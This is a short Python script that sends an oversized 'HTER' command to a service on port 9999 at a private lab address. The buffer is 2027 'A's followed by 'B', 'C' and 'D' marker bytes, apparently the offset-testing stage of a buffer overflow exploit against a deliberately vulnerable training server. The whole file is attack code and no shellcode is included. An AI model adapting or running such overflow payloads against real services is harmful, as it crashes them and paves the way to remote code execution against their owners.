#!/usr/bin/python3

import socket

payload = "A" * 2027 + "B" * 14 + "C" * 4 + "D" * 4

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.100.129", 9999))
recv = s.recv(1024)
print(recv.decode())
s.send(("HTER " + payload + "\r\n").encode())
r = s.recv(1024)
print(r.decode())
s.close()